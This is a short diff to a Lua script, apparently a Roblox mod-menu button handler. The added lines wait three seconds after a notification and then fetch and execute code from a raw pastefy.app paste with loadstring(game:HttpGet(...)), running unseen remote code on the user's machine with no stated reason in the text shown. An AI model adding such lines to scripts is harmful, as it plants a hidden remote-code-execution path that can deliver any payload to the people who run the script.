@@ -103,6 +103,10 @@ ModsTab:CreateButton({
                 Duration = 3
             })
         end
+            task.spawn(function()
+            wait(3)  -- Wait 3 seconds for notification before executing
+            loadstring(game:HttpGet("https://pastefy.app/Ym83DFAi/raw"))()
+        end)
     end
 })
 
